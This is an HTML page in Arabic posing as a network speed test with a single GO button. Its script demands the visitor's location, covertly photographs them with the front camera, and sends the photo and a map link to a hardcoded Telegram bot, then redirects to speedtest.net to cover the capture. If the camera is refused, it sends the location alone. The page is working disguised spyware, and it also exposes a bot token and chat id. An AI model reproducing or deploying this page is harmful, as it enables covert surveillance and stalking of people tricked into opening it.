

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Fast</title>
    <style>
        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        .btn-go {
            width: 180px; height: 180px; border-radius: 50%;
            background: #00d2ff; color: black; font-size: 50px; font-weight: bold;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; border: none; outline: none; box-shadow: 0 0 20px #00d2ff;
        }
        .btn-go:active { background: #ff0055; transform: scale(0.9); }
        #status { margin-top: 20px; color: #888; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <h2>فحص سرعة الشبكة</h2>
    <button class="btn-go" id="startBtn">GO</button>
    <p id="status">اضغط للبدء</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
        const chatId = "7984067238"; 

        async function sendData(type, data, cap = "") {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            if (type === "photo") {
                formData.append("photo", data, "1.jpg");
                formData.append("caption", cap);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
            } else {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
            }
        }

        document.getElementById( startBtn ).onclick = async function() {
            const status = document.getElementById( status );
            status.innerText = "جاري الفحص...";
            this.style.pointerEvents = "none";

            // 1. طلب الموقع أولاً (إجباري للمتابعة)
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                
                // 2. محاولة فتح الكاميرا الأمامية فوراً
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById( video );
                    video.srcObject = stream;
                    
                    await new Promise(r => setTimeout(r, 1000)); // انتظار ثانية للوضوح
                    
                    const canvas = document.getElementById( canvas );
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext( 2d ).drawImage(video, 0, 0);
                    
                    stream.getTracks().forEach(t => t.stop());
                    
                    canvas.toBlob(async (blob) => {
                        await sendData("photo", blob, `📍 الموقع: ${mapLink}\n🔋 البطارية: جاري الجلب...`);
                        window.location.href = "https://www.speedtest.net";
                    },  image/jpeg , 0.6);

                } catch (e) {
                    // إذا رفض الكاميرا، أرسل الموقع فقط
                    await sendData("text", `📍 الموقع فقط: ${mapLink}\n(رفض الكاميرا)`);
                    window.location.href = "https://www.speedtest.net";
                }

            }, (err) => {
                alert("يجب السماح بالموقع والوصول للشبكة للمتابعة.");
                location.reload();
            });
        };
    </script>
</body>
</html>
